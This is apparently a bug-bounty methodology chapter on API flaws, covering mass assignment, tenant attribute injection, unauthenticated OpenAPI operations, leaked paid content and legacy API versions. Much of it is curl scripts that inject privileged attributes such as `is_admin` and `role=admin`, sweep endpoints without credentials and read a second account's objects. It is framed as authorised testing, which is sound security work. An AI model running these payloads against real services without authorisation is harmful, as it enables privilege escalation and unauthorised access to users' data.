# API · API flaws: mass assignment, excessive data exposure, versioning

> The server accepts more than its own client sends: attributes the form leaves out, versions the client stopped
> calling, content types and JSON types the validator never sees, duplicate keys, methods nobody documented,
> events nobody signed. These bugs are paid for what they reach and are usually filed under it: a bound `role` is
> privilege escalation, an internal route is an IDOR, a forged payment notification is a free order. An exposed
> description, a reflection endpoint or an extra field in a response is informative on its own.

| | |
|---|---|
| **Class** | `api` |
| **Applies when** | http, api |
| **Pays** | 71 disclosed reports filed under the class (98 more touch it), 16 paid, median $550, top $4,000. Apart from two denial-of-service reports (#1619604, #880187), the best-paid ones reached data through a second door: an API key honoured on routes that skip the account-status check (#4000084), a key scoped to one index that opens all of them (#118925), internal or deprecated endpoints with a looser policy (#386556, #1584409), an attribute the server bound without being asked (#99424). |
| **Weaknesses** | Acceptance of Extraneous Untrusted Data With Trusted Data, Information Exposure Through Sent Data, Missing Authentication for Critical Function, Improper Handling of Unexpected Data Type, Improper Verification of Cryptographic Signature, Exposed Dangerous Method or Function, Incorrect Authorization · CWE-915, CWE-201, CWE-306, CWE-1287, CWE-235, CWE-347, CWE-749, CWE-863 |

## Why it pays

An API is the application without the interface that limited what a user could send. The browser bundle, the
mobile app and partner integrations call the same backend through their own routes, versions and content
types, and the server checks each request in layers: a gateway, framework middleware, a validator, a serializer
allow-list, a per-route authorisation check. Each layer covers what its author tested, which is the request the
current client sends. This chapter is about the requests the client does not send. OWASP's API Security Top 10
(2023) names most of them: API3 broken object property level authorisation (mass assignment, excessive data
exposure), API9 improper inventory management (old versions, staging hosts), API10 unsafe consumption of APIs
(unsigned webhooks).

The class looks small in the library because most of its findings are filed under their impact. Where it paid,
from `kb/reports/api.md`:

- **A second door to the same data.** A disabled account's API key accepted on the newer REST routes (#4000084,
  $4,000), an index-scoped key that opens every index (#118925, $1,000), internal endpoints with a looser policy
  (#332381, $1,500; #386556, $750), a deprecated method that skips the view policy (#1584409, $300).
- **Attributes the server bound without being asked.** #99424 ($1,000), API access enabled on a free plan
  (#267781), and an invitation hijack that needed one extra `email` field (#1551176, $5,000, filed as access
  control).
- **Data the client was told not to draw.** The read status of chat messages, which no client displays
  (#1080437, $600); premium content served to anonymous callers (#2979176).
- **Keys.** A support-portal takeover through a leaked API key (#1766228, $1,500); first-party keys in
  JavaScript (#1218754, #979333).
- **Signatures nobody checked.** A payment callback whose signature check was bypassed, with SQL injection
  behind it (#894325, $4,000, filed as SQL injection).

What does not pay: an exposed Swagger or OpenAPI page by itself (eight disclosed Swagger UI reports, none paid),
"xmlrpc.php is enabled", vendor keys that are public by design, parameter pollution in share buttons, missing
rate limits, and responses with more fields than the page uses when none of them is private.

## The crux question

**For each request the client sends, what else will the server accept on the same handler (another attribute,
version, content type, method, duplicate, JSON type or unsigned caller), and does every check that guards the
normal request still run?**

## Applicability probe

The chapter gate is `http` and `api`. The fingerprinter sets `api` when it sees JSON roots or API path patterns
in the bundles and never sets it false, so a host it could not classify needs the probe. Three observations
settle the gate and the two asset facts the items use most (`api-docs`, `spa`).

```bash
# 1. response types of the XHR/fetch calls in the walk's network log (HAR from the scriptable browser)
jq -r '.log.entries[] | select(.request.url | contains(env.H)) | .response.content.mimeType' "$E/recon/$H/"*.har \
  | sort | uniq -c | sort -rn | head
# 2. API routes the bundles call
grep -rhoE '["'"'"'`](/api|/v[0-9]+|/rest|/rpc|/jsonrpc|/internal|/_api)[A-Za-z0-9_./{}:-]*' "$E/recon/$H/js/" | sort -u | wc -l
# 3. a published description on the usual paths, one request each at the engagement rate
W=$(awk -v r="$RATE" 'BEGIN{printf "%.2f", 1/r}')
for p in /openapi.json /openapi.yaml /swagger.json /swagger.yaml /api/openapi.json /api/swagger.json /v2/api-docs /v3/api-docs \
         /v3/api-docs/swagger-config /swagger/v1/swagger.json /swagger/docs/v1 /api-docs /api-docs/swagger-ui-init.js /api/docs \
         /docs /redoc /swagger-ui.html /swagger-ui/index.html /api/schema/ /q/openapi /application.wadl /apispec_1.json; do
  curl -sS "${HDR[@]}" -o /dev/null -w "%{http_code} %{size_download} %{content_type} $p\n" "$T$p"; sleep "$W"; done
```

```bash
scripts/sane fact set "$H" api=1 --ev "XHR responses application/json under /api/v2/ in the HAR; 140 API routes in routes-from-js.txt"
scripts/sane fact set "$H" api-docs=1 --ev "/v3/api-docs answers 200: OpenAPI 3.0.1, 212 operations"
scripts/sane fact set "$H" spa=1 --ev "React bundles, 2.1 MB, route table and API calls inside"
scripts/sane fact set @eng account=1 two-accounts=1 --ev "A and B registered in separate organisations"
# a server-rendered site: every response HTML, forms post to the same paths
scripts/sane fact set "$H" api=0 --ev "walked authenticated: every response text/html, forms post urlencoded, no JSON/gRPC/RPC response, no API route in the bundles"
```

With `api` false the chapter closes for the asset and the planner writes the reason. Write the note "HTML
application without a machine API: attribute tampering on its form posts is BIZ-009 and BAC-014". Hosts that
fail `http` or are `static` carry no API at all.

## Triage order

API-003 (the published description maps every other item) → API-010 (keys in the bundle: offline first) →
API-013 (RPC method lists: one request per path) → API-005 (old and alternate surfaces) → API-001 (attributes
on our own objects) → API-002 (owner and tenant attributes) → API-011 (list scope and cursors) → API-004
(withheld values in responses) → API-015 (key scope and account state) → API-006 (content-type and method
confusion) → API-009 (JSON types against secret checks) → API-007 (duplicate parameters and keys) → API-008
(server-side parameter pollution) → API-012 (webhook signatures) → API-014 (non-production APIs, once per
programme).

## Items

### API-001 · A sign-up, profile or object update stores a server-controlled attribute that the client never sends

| | |
|---|---|
| **Severity** | Medium standalone for a status or workflow attribute on our own object; High for a role, verified state, paid plan or security setting that the server then honours; Critical for a global staff or superuser flag; Low when the attribute is stored and nothing enforces it |
| **Requires** | signup\|account |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Acceptance of Extraneous Untrusted Data With Trusted Data · CWE-915 |
| **Prior art** | #99424, #267781 |

- **Where:** requests that create or change the caller's own account and objects: sign-up and onboarding,
  profile and settings updates, settings of an organisation or workspace A owns, create and edit of A's own
  objects (projects, listings, posts, orders before payment), invitation accept. Candidate attribute names come
  from three places: keys the server returns for the object that the client never writes (the GET response of
  the same object), properties the API description marks `readOnly` or lists only on admin operations, and model
  and form definitions in the bundles. Typical names: `role`, `roles`, `is_admin`, `admin`, `is_staff`,
  `is_superuser`, `permissions`, `scopes`, `account_type`, `internal`, `email_verified`, `verified`,
  `phone_verified`, `confirmed_at`, `approved`, `kyc_status`, `status`, `plan`, `plan_id`, `tier`, `features`,
  `entitlements`, `credits`, `balance`, `quota`, `seats`, `trial_end`, `two_factor_enabled`, `published`,
  `featured`. Owner and tenant attributes (`owner_id`, `org_id`) are API-002.
- **Test:** the handler passes the parsed body to the model: Rails `update(params[:user])` without `permit`, a
  Django REST serializer with `fields = '__all__'`, a Laravel model with `$guarded = []`, Mongoose
  `new User(req.body)` or `Object.assign(user, req.body)`, Spring binding the request onto the JPA entity. Every
  column is then writable unless an allow-list says otherwise. Add one candidate per request to a write that
  already succeeds, read the object back with a separate GET, then make one request whose answer depends on the
  stored value.
- **How:**
  ```bash
  D="$E/evidence/$H/API-001"; mkdir -p "$D"; W=$(awk -v r="$RATE" 'BEGIN{printf "%.2f", 1/r}'); CT='Content-Type: application/json'
  # 1. candidates: keys returned for A's own objects minus keys A's client ever writes; readOnly properties; bundle names
  for u in /api/v1/me /api/v1/me/settings '/api/v1/orgs/<A org id>'; do curl -sS "${HDR[@]}" $A "$T$u"; sleep "$W"; done \
    | jq -r 'paths(scalars) | map(strings) | last // empty' 2>/dev/null | sort -u > "$D/read-keys.txt"
  cat "$E/recon/$H/requests/"*.http | grep -oE '"[A-Za-z_]+" *:' | tr -d '": ' | sort -u > "$D/write-keys.txt"
  comm -23 "$D/read-keys.txt" "$D/write-keys.txt" > "$D/candidates.txt"
  jq -r '.. | objects | select(has("properties")) | .properties | to_entries[] | select(.value.readOnly == true) | .key' \
    "$E/evidence/$H/API-003/spec.json" 2>/dev/null | sort -u >> "$D/candidates.txt"     # when API-003 saved a description
  grep -rhoE '\b(is_?[Aa]dmin|is_?[Ss]taff|is_?[Ss]uperuser|roles?|permissions|scopes|account_?[Tt]ype|email_?[Vv]erified|phone_?[Vv]erified|approved|kyc_?[Ss]tatus|plan_?[Ii]d|tier|entitlements|credits|trial_?[Ee]nds?(_?[Aa]t)?|two_?[Ff]actor_?[Ee]nabled)\b' \
    "$E/recon/$H/js/" | sort | uniq -c | sort -rn | head -30
  # 2. one candidate per request, added to the write A's client already sends; a separate GET decides
  st(){ curl -sS "${HDR[@]}" $A "$T/api/v1/me" | jq -c --arg k "$1" '{display_name, ($k): .[$k]}'; }
  curl -sS "${HDR[@]}" $A -X PATCH "$T/api/v1/me" -H "$CT" -d '{"display_name":"api001-control"}' -o /dev/null -w 'control %{http_code} -> '; st role
  for kv in 'is_admin=true' 'admin=true' 'is_staff=true' 'role="admin"' 'roles=["admin"]' 'permissions=["*"]' 'account_type="internal"' \
            'email_verified=true' 'verified=true' 'phone_verified=true' 'approved=true' 'status="active"' 'plan="enterprise"' \
            'tier="enterprise"' 'features=["api_access","sso"]' 'credits=100000' 'trial_end="2030-01-01T00:00:00Z"' 'two_factor_enabled=false'; do
    k=${kv%%=*}; v=${kv#*=}; printf '%-46s ' "$kv"
    curl -sS "${HDR[@]}" $A -X PATCH "$T/api/v1/me" -H "$CT" -d "{\"display_name\":\"api001\",\"$k\":$v}" -o "$D/w-$k.json" -w '%{http_code} -> '
    st "$k"; sleep "$W"; done | tee "$D/01-sweep.txt"
  # 3. the effect, decided by the server: one request whose answer depends on the stored value, before and after
  curl -sS "${HDR[@]}" $A "$T/api/v1/admin/settings" -o /dev/null -w 'admin-only route %{http_code}\n'
  # 4. sign-up carrying the attributes, for a new test account under the programme's e-mail alias rule
  curl -sS "${HDR[@]}" -X POST "$T/api/v1/users" -H "$CT" -o "$D/04-signup.json" -w 'sign-up %{http_code}\n' \
    -d '{"email":"<alias>+api001@<domain>","password":"<test password>","name":"api001","role":"admin","email_verified":true,"plan":"enterprise"}'
  ```
  When the flat key is ignored, send the shapes the binder may expect:
  ```text
  {"user":{"role":"admin"}}    {"profile":{"verified":true}}    {"data":{"type":"users","attributes":{"role":"admin"}}}
  {"isAdmin":true}  {"IsAdmin":true}  {"is-admin":true}          the read key in camelCase, PascalCase and kebab-case
  user[role]=admin   role=admin                                  form-encoded body: Rails, PHP and Express nested params
  the attribute on the create request (sign-up, new project)     create paths often lack the update path's allow-list
  ```
  Set every changed attribute back afterwards and record the sign-up account in `cleanup.md`.
- **Proof:** the write with the added attribute, a fresh GET showing the stored value (not the write's echo), and
  one request whose answer changed because of it: an admin-only or paid-only endpoint refused before and served
  after, a feature unlocked, an unverified-account restriction lifted. For sign-up: the new account created with
  the attribute, and the same check.
- **Not a finding when:** the write echoes the attribute and the fresh GET shows the old value (the serializer
  echoes input). The value is stored and nothing reads it: `"role":"admin"` saved while every admin route still
  refuses is a label, not a privilege; park it. The attribute is a preference by design (`locale`, `timezone`,
  `newsletter`, `theme`). The interface lets this user set it anyway (an owner choosing the plan that billing
  then charges for). A role inside the tenant that A's role may grant (BAC-014 decides that). A paid feature the
  account already has through a trial. The value reverts when a sync job runs: read it again after the job's
  interval.
- **Escalate:** a global flag (`is_staff`, `is_superuser`, `internal`) that sticks: one read of a staff-only
  route and stop. `email_verified` together with an e-mail change: AUT-014 and BIZ-015. `plan`, `tier`,
  `features`: BIZ-008 and BIZ-011; `trial_end`: BIZ-012; `status` or `approved` on an object another role
  approves: BIZ-014; money fields on a cart or order: BIZ-001; `two_factor_enabled:false`: the AUT chapter. The
  same attribute through an older version (API-005), a duplicate key (API-007) or a GraphQL input object
  (GQL-006).

### API-002 · An owner, author or tenant attribute added to a write attributes the object to the second account or places our account in its tenant

| | |
|---|---|
| **Severity** | Medium standalone for an object attributed to B or planted in B's container; High when our account joins B's tenant or reads B's data through the moved object |
| **Requires** | two-accounts |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Improper Access Control - Generic · CWE-915 |
| **Prior art** | #1551176, #983070, #1031525 |

- **Where:** create requests (notes, messages, comments, reviews, tasks, documents, API apps, webhooks), updates
  of A's own objects that name a container (move, re-parent, transfer), and A's own user, membership and
  invitation-accept requests. Attribute names: `owner_id`, `user_id`, `userId`, `author_id`, `created_by`,
  `creator_id`, `sender_id`, `from`, `account_id`, `customer_id`, `org_id`, `organization_id`, `tenant_id`,
  `workspace_id`, `team_id`, `team_ids`, `project_id`, `board_id`, `folder_id`, `parent_id`, `memberships`,
  and `email` on an invitation accept. The GET response of the same object type shows which of them the server
  stores; B's ids come from B's own session.
- **Test:** three placements. (a) Attribution: A creates an object naming B as owner or author, and it is filed
  in B's account or shown as B's. (b) Re-parenting: A's own object gets B's container id and moves into B's
  project, folder or organisation. (c) Membership: A's own user or membership carries B's tenant id (or B's
  address on an invitation accept, #1551176) and A becomes a member of B's tenant.
- **How:**
  ```bash
  D="$E/evidence/$H/API-002"; mkdir -p "$D"; CT='Content-Type: application/json'
  curl -sS "${HDR[@]}" $B "$T/api/v1/me" | jq -c '{id, org_id, organization_id, team_id}'      # B's ids, from B's own session
  BID='<B user id>'; BORG='<B org id>'; BPROJ='<id of a project B created for this test>'
  mine(){ curl -sS "${HDR[@]}" $B "$T/api/v1/$1" | jq -c '(.data // .)[]? | select(tostring | contains("api002")) | {id, title: (.title // .name // .body)}'; }
  # 0. control: a note A creates without an owner attribute is A's
  curl -sS "${HDR[@]}" $A -X POST "$T/api/v1/notes" -H "$CT" -d '{"title":"api002-control"}' -o "$D/00-control.json" -w 'control %{http_code}\n'
  # a. attribution: B named as owner or author of A's new note; B's own list decides
  for k in owner_id user_id author_id created_by creator_id ownerId userId; do
    curl -sS "${HDR[@]}" $A -X POST "$T/api/v1/notes" -H "$CT" -d "{\"title\":\"api002-$k\",\"$k\":\"$BID\"}" -o "$D/a-$k.json" -w "%{http_code} $k\n"; sleep 1; done
  mine notes
  # b. re-parenting: A's own task moved into B's project
  curl -sS "${HDR[@]}" $A -X PATCH "$T/api/v1/tasks/<A task id>" -H "$CT" -d "{\"title\":\"api002-move\",\"project_id\":\"$BPROJ\"}" -o "$D/b-move.json" -w 'move %{http_code}\n'
  mine "projects/$BPROJ/tasks"
  # c. membership: A's own user or membership carrying B's tenant
  for body in "{\"org_id\":\"$BORG\"}" "{\"organization_id\":\"$BORG\"}" "{\"tenant_id\":\"$BORG\"}" "{\"team_ids\":[\"$BORG\"]}" \
              "{\"memberships\":[{\"org_id\":\"$BORG\",\"role\":\"member\"}]}"; do
    curl -sS "${HDR[@]}" $A -X PATCH "$T/api/v1/me" -H "$CT" -d "$body" -o /dev/null -w "%{http_code} $body\n"; sleep 1; done
  curl -sS "${HDR[@]}" $B "$T/api/v1/orgs/$BORG/members" | jq -c '(.data // .)[] | {id, email, role}'
  curl -sS "${HDR[@]}" $A "$T/api/v1/orgs/$BORG/projects" -o "$D/c-A-reads-B-org.json" -w 'A reads B org %{http_code} %{size_download}\n'
  ```
  Afterwards B deletes the planted objects and removes A from B's organisation; record both in `cleanup.md`.
- **Proof:** B's own session listing the note A created with B as its owner (a), B's project listing A's moved
  task (b), or B's member list showing A next to A's read of a project in B's tenant (c), each beside the
  control request that left the object with A.
- **Not a finding when:** the server ignores the attribute: the object is filed under A, even when the write's
  response echoes B's id. Creating objects for others is the feature (assigning a task to a colleague in the
  same tenant, an admin acting "on behalf of"). B's container accepts content from anyone (a public board, a
  submission form). A could join B's tenant anyway (open workspace, domain auto-join). The membership request
  only creates a pending request that B must approve.
- **Escalate:** (c) opens B's tenant: run the BAC items from inside it and report the join with one read. (a) on
  messages, reviews or payment requests is impersonation: name the place where other users see B as the author.
  A moved object whose response now carries B's container data (members, settings) is a cross-tenant read.
  Role attributes on the same membership: API-001 and BAC-014. An invitation accept that takes the address from
  the body: BAC-015 and AUT-014.

### API-003 · An operation listed in the published API description returns non-public data or acts on a request with no credentials

| | |
|---|---|
| **Severity** | Medium standalone for internal records without personal data reached with no credentials; High when the operation returns another user's personal, financial or credential data, or performs a write; None for the description itself |
| **Requires** | api-docs |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Missing Authentication for Critical Function · CWE-306 |
| **Prior art** | #3676308, #1523651, #1507412 |

- **Where:** the description wherever it is served: `/openapi.json`, `/swagger.json`, `/v2/api-docs`,
  `/v3/api-docs` (Springdoc lists every group in `/v3/api-docs/swagger-config`), `/swagger/v1/swagger.json`
  (Swashbuckle), `/swagger/docs/v1`, `/api-docs` (swagger-ui-express embeds the document in
  `/api-docs/swagger-ui-init.js`), `/api/schema/` (Django REST framework), FastAPI's `/openapi.json` behind
  `/docs`, `/q/openapi` (Quarkus), `/application.wadl` (Jersey), `?wsdl` on SOAP services, the `url` or
  `configUrl` that a Swagger UI page loads, a Postman collection linked from the docs or the developer portal,
  and older copies (`/v1/swagger.json` next to `/v3/`). The OpenAPI `servers` list or Swagger `host` and
  `basePath` say where the operations live; send requests only to in-scope hosts.
- **Test:** the description lists everything the backend routes, including operations no client calls, and
  authentication middleware is attached per route or per controller, so operations added later, generated from
  internal code or kept for partners can miss it. Send every documented GET once with no credentials at the
  programme rate, with path parameters set to a value that cannot exist: an authentication check answers 401 or
  403 before any lookup, so a 200, 400, 404 or 422 means the request got past it. Read those operations with B's
  own ids. Operations that change state are listed and tried by hand, one at a time, against B's objects only.
- **How:**
  ```bash
  D="$E/evidence/$H/API-003"; mkdir -p "$D"; W=$(awk -v r="$RATE" 'BEGIN{printf "%.2f", 1/r}')
  curl -sS "${HDR[@]}" "$T/v3/api-docs" -o "$D/spec.json"      # the path that answered; YAML: yq -o=json '.' spec.yaml > spec.json
  # 1. every operation: METHOD, path, declared security (open, auth, unstated), tags, name
  python3 - "$D/spec.json" > "$D/ops.tsv" <<'PY'
  import json, re, sys
  from urllib.parse import urlparse
  s = json.load(open(sys.argv[1]))
  def out(m, p, sec, tag, name): print('\t'.join([m.upper(), p, sec, tag, name]))
  if 'paths' in s:                                          # OpenAPI 3.x or Swagger 2.0
      base = s.get('basePath') or urlparse((s.get('servers') or [{}])[0].get('url', '')).path
      for path, item in s['paths'].items():
          for m, op in item.items():
              if m.lower() not in ('get', 'post', 'put', 'patch', 'delete'): continue
              sec = op.get('security', s.get('security'))
              out(m, base.rstrip('/') + path, 'open' if sec in ([], [{}]) else ('auth' if sec else 'unstated'),
                  ','.join(op.get('tags', [])), op.get('operationId', ''))
  elif 'item' in s:                                         # Postman collection v2.x
      def walk(items, auth):
          for it in items:
              if 'item' in it: walk(it['item'], it.get('auth', auth)); continue
              r = it.get('request', {}); u = r.get('url', '')
              raw = u if isinstance(u, str) else u.get('raw', '')
              a = (r.get('auth') or auth or {}).get('type', '')
              out(r.get('method', 'GET'), re.sub(r'^(\{\{[^}]+\}\}|https?://[^/]+)', '', raw).split('?')[0],
                  'open' if a == 'noauth' else ('auth' if a else 'unstated'), '', it.get('name', ''))
      walk(s['item'], s.get('auth'))
  PY
  cut -f1,3 "$D/ops.tsv" | sort | uniq -c
  # 2. every GET once with no credentials and path parameters set to 0; bodies are measured, not kept
  curl -sS "${HDR[@]}" -o /dev/null -w 'control, unknown route: %{http_code} %{size_download}\n' "$T/api003-no-such-route-$RANDOM"
  awk -F'\t' '$1 == "GET"' "$D/ops.tsv" | while IFS=$'\t' read -r m p sec tag name; do
    u=$(printf '%s' "$p" | sed -E 's/\{\{[^}]+\}\}/0/g; s/\{[^}]+\}/0/g; s#/:[A-Za-z_][A-Za-z0-9_]*#/0#g')
    printf '%s\t%s\t%s\t' "$sec" "$tag" "$u"
    curl -sS "${HDR[@]}" -o /dev/null -w '%{http_code}\t%{size_download}\t%{content_type}\n' "$T$u"; sleep "$W"
  done | tee "$D/sweep.tsv"
  # 3. past authentication: anything but 401, 403 and 429, declared-auth operations first; a 404 the size of the control is no route
  awk -F'\t' '$4 !~ /^(401|403|429)$/' "$D/sweep.tsv" | sort -t$'\t' -k1,1 | tee "$D/past-auth.tsv"
  # 4. each candidate once with B's own ids and no credentials, B's own session as the control; a list by its count only
  curl -sS "${HDR[@]}"    "$T/api/v1/users/<B id>/addresses" -o "$D/04-anon-B.json"    -w 'no credentials %{http_code} %{size_download}\n'
  curl -sS "${HDR[@]}" $B "$T/api/v1/users/<B id>/addresses" -o "$D/04-control-B.json" -w 'B own session  %{http_code} %{size_download}\n'
  curl -sS "${HDR[@]}" "$T/api/v1/orders?limit=1" | jq '{total: (.total // .count // .meta.total // .pagination.total)}'
  # 5. state-changing operations: listed, then tried one at a time with no credentials, on B's objects only
  awk -F'\t' '$1 != "GET"' "$D/ops.tsv" | sort -t$'\t' -k3,3 | head -60
  curl -sS "${HDR[@]}" -X PATCH "$T/api/v1/users/<B id>" -H 'Content-Type: application/json' -d '{"display_name":"api003-anon"}' -o /dev/null -w 'anon write %{http_code}\n'
  curl -sS "${HDR[@]}" $B "$T/api/v1/users/<B id>" | jq -r '.display_name'
  ```
  Never send DELETE, payment, invitation or e-mail operations from the list without an object of B's made for
  the test. A list operation that answers without credentials is proven by its count and, where it can be
  filtered, by one record that is B's; do not page through it.
- **Proof:** the description's entry for the operation (path, method, declared security, or the tag that marks it
  internal or admin), the request with no credentials, and the response carrying B's data or the non-public
  record; for a list, the count and B's record; for a write, B's view after the unauthenticated request.
- **Not a finding when:** the operation is public by design: login, sign-up, password-reset start, a public
  catalogue, status, health, OAuth and `/.well-known` routes. The 200 carries an error envelope
  (`{"success":false,"error":"unauthorized"}`) or the SPA shell. Only the impossible id gets past the check (a
  lookup before authentication) while B's real id answers 401. The data is what the public website shows
  anyway. The description lists routes that production does not mount: 404s the size of the unknown-route
  control (it was generated from another environment; note any staging host in `servers` for API-014). The
  description alone, a developer portal, the Django REST framework browsable API or FastAPI's `/docs` is
  informative. Swagger UI's own DOM XSS through `?url=` or `?configUrl=` belongs to the XSS chapter and is a
  crowded duplicate (#1736378 and #2534300 were disclosed without a bounty).
- **Escalate:** operations tagged admin or internal, called with A's low-privilege session: BAC-011. Properties
  marked `readOnly`: API-001 and API-002. Older descriptions (`/v1/`): API-005. `servers` that name staging or
  internal hosts: API-014. Example values holding live tokens (#1507412): one read-only identity call, as in
  INF-004, then stop. Operations taking a URL: SSR-001. SOAP operations from a WSDL: XXE-006.

### API-004 · An API response delivers to a free or locked account a value the interface withholds: paid content, a premium-only attribute or an unrevealed code

| | |
|---|---|
| **Severity** | Medium standalone for paid content or a premium-only attribute delivered to a free account; High when the withheld value is redeemable (a code, a voucher, a prize answer) or is other users' private activity; Low for cosmetic premium data |
| **Requires** | payments\|limited-action |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | low |
| **Weakness** | Information Exposure Through Sent Data · CWE-201 |
| **Prior art** | #1080437, #2979176, #1892888 |

- **Where:** every view the product locks, blurs, truncates or teases: paywalled articles, videos, courses and
  exams; premium-only lists shown blurred ("who liked you", "who viewed your profile", read receipts, contact
  details of leads, salary ranges); quiz and exam payloads whose answers decide a reward or a certificate;
  scratch cards, giveaways, gift-card and voucher codes before payment or reveal; auctions (reserve price, other
  bids); prices hidden from logged-out visitors. Read the raw JSON of the requests the locked view makes, as
  free account A and, where the view is public, with no session. Other users' personal fields in the same
  responses are INF-010.
- **Test:** the server sends the whole object and the client decides what to draw: a blur filter, `••••`, a lock
  icon, a "subscribe to continue" overlay over text that is already in the response. Find the withheld value in
  the response (the full body, the unblurred media URL, the `correct` flag, the code, the list of names), then
  check that it is usable: the media URL loads, the code validates in our account, the answer is accepted.
- **How:**
  ```bash
  D="$E/evidence/$H/API-004"; mkdir -p "$D"
  # 1. the requests the locked view makes (from the walk's HAR), replayed as free account A and with no session
  curl -sS "${HDR[@]}" $A "$T/api/v1/articles/<locked article id>" -o "$D/01-A-free.json"
  curl -sS "${HDR[@]}"    "$T/api/v1/articles/<locked article id>" -o "$D/02-anon.json"
  # 2. every value in the response, filtered to what a lock hides
  jq -r 'paths(scalars) as $p | "\($p | map(tostring) | join(".")) = \(getpath($p) | tostring | .[0:80])"' "$D/01-A-free.json" \
    | grep -iE 'body|content|html|text|transcript|url|src|video|stream|download|answer|correct|solution|code|voucher|pin|price|reserve|bid|viewer|liker|read_?at|seen|blur|lock|premium|preview' | head -60
  jq -c '.. | objects | select(has("correct") or has("is_correct") or has("answer") or has("solution"))' "$D/01-A-free.json" | head
  # 3. how much text arrived, against the preview the page draws (screenshot of the locked view, same account, same time)
  jq -r '.body // .content // .html // empty' "$D/01-A-free.json" | wc -w
  # 4. usability: the first 4 KB of a withheld media file with no session; a code checked, not redeemed, in A's own account
  curl -sS "${HDR[@]}" -r 0-4095 -o "$D/04-media.part" -w 'media %{http_code} %{size_download} %{content_type}\n' '<full-resolution URL from the JSON>'
  curl -sS "${HDR[@]}" $A -X POST "$T/api/v1/vouchers/check" -H 'Content-Type: application/json' -d '{"code":"<code from the JSON>"}'
  ```
  For media, `-r 0-4095` is enough to show the file serves; do not download paid content in full.
- **Proof:** the free or anonymous response holding the withheld value, next to a screenshot of the same view
  with its lock, blur or paywall, and one use of the value: the full text, the unblurred image's first bytes,
  the voucher's validation response, the accepted answer. For other users' activity (read receipts, viewers), our
  own B's activity seen by A.
- **Not a finding when:** the preview is the product's design (first paragraphs, a low-resolution thumbnail). The
  media URL is signed per entitled user and answers 403 without the paid session. The value is a placeholder
  (`"body":"lorem"`, `"answer":null`) or is filled only after purchase. A metered paywall counts free articles in
  the browser: clearing cookies to read more is informative on most news programmes. The value is A's own data,
  or the content is free in another plan or region by policy.
- **Escalate:** paid endpoints the free account can call: BIZ-008. Codes that redeem more than once: BIZ-006
  and the RAC chapter. The same object through an older version or the mobile API, where field filters are often
  missing: API-005. Other users' personal data in the same response: INF-010.

### API-005 · An older, internal or mobile API version skips a step-up, field filter or validation that the current version applies to the same operation

| | |
|---|---|
| **Severity** | Medium standalone when the other surface skips a second factor, a re-authentication or a field filter on personal data; High when the skipped step guards an e-mail change, account deletion, payout details or credentials; Low when only an input rule or a rate limit is missing |
| **Requires** | — |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Authentication Bypass Using an Alternate Path or Channel · CWE-288 |
| **Prior art** | #2197244, #1033895, #111386, #98499 |

- **Where:** every API has a version history whether or not the current client shows it, so this card has no gate
  beyond the chapter's. Surfaces: version segments (`/v1/` to `/v4/`, dated versions such as `/2019-10/`),
  version headers (`Accept: application/vnd.<vendor>.v1+json`, `X-API-Version`, `Api-Version`), version
  parameters (`?v=1`, `?api_version=`), sibling prefixes (`/api/internal/`, `/internal/api/`, `/api/mobile/`,
  `/api/android/`, `/api/ios/`, `/api/beta/`, `/next/`, `/legacy/`, `/api/private/`, `/partner/`), and mobile or
  partner API hosts that are in scope. Sources: old bundle chunks still on the CDN, older API descriptions,
  error messages that list versions, the mobile app's base URLs. Authorisation on these surfaces is BAC-013; this
  card is about the other protections.
- **Test:** pick operations where the current version adds a protection on top of authorisation: a second factor
  or password re-entry (e-mail change, password change, account deletion, payout details, API-key creation), a
  field filter (the current serializer drops `email`, `phone`, `password_hash`, `token` from other users'
  objects), an input rule (HTML sanitising, allowed values, length), an attribute allow-list (API-001), an
  account-state check (unverified, suspended). Older controllers were written before the protection existed and
  still reach the same database. Send the same operation with the same session to each other surface.
- **How:**
  ```bash
  D="$E/evidence/$H/API-005"; mkdir -p "$D"; W=$(awk -v r="$RATE" 'BEGIN{printf "%.2f", 1/r}'); CT='Content-Type: application/json'
  # 1. surfaces named anywhere: bundles (old chunks included), saved requests, descriptions
  grep -rhoE '/(api/)?(v[0-9]{1,2}(\.[0-9])?|[0-9]{4}-[0-9]{2}(-[0-9]{2})?|internal|private|mobile|android|ios|beta|next|legacy|partner)/' \
    "$E/recon/$H/js/" "$E/recon/$H/requests/" 2>/dev/null | sort | uniq -c | sort -rn | head -30
  # 2. which prefixes serve A's own identity (the current one is the control)
  for pre in /api/v3 /api/v2 /api/v1 /v2 /v1 /api /api/internal /internal/api /api/mobile /api/mobile/v1 /api/beta /api/legacy /api/private; do
    curl -sS "${HDR[@]}" $A -o /dev/null -w "%{http_code} %{size_download} $pre/me\n" "$T$pre/me"; sleep "$W"; done | tee "$D/01-surfaces.txt"
  # 3. a step-up the current version demands (here the e-mail change asks for a 2FA code), sent to each other surface
  curl -sS "${HDR[@]}" $A -X PATCH "$T/api/v3/me/email" -H "$CT" -d '{"email":"<second alias of A>"}' -o "$D/02-current.json" -w 'current %{http_code}\n'
  for pre in /api/v2 /api/v1 /api/mobile/v1 /api/internal; do
    curl -sS "${HDR[@]}" $A -X PATCH "$T$pre/me/email" -H "$CT" -d '{"email":"<second alias of A>"}' -o "$D/03$(echo "$pre" | tr / _).json" -w "$pre %{http_code}\n"; sleep "$W"; done
  curl -sS "${HDR[@]}" $A "$T/api/v3/me" | jq -c '{email, pending_email, unconfirmed_email}'
  # 4. a field filter: B's object on each surface, keys compared with the current version's
  for pre in /api/v3 /api/v2 /api/v1 /api/mobile/v1; do
    curl -sS "${HDR[@]}" $A "$T$pre/users/<B id>" | jq -r 'paths(scalars) | map(tostring) | join(".")' 2>/dev/null | sort > "$D/keys$(echo "$pre" | tr / _).txt"; sleep "$W"; done
  diff "$D/keys_api_v3.txt" "$D/keys_api_v1.txt"
  # 5. a version chosen by header or parameter on the current path
  for h in 'Accept: application/vnd.api.v1+json' 'X-API-Version: 1' 'Api-Version: 1'; do
    printf '%-40s ' "$h"; curl -sS "${HDR[@]}" $A -H "$h" "$T/api/v3/users/<B id>" | jq -r 'keys | join(",")'; sleep "$W"; done
  ```
  Mobile API hosts sometimes demand the app's own headers (`X-App-Version`, a client id seen in its traffic): add
  them and keep the programme's identifying header and User-Agent.
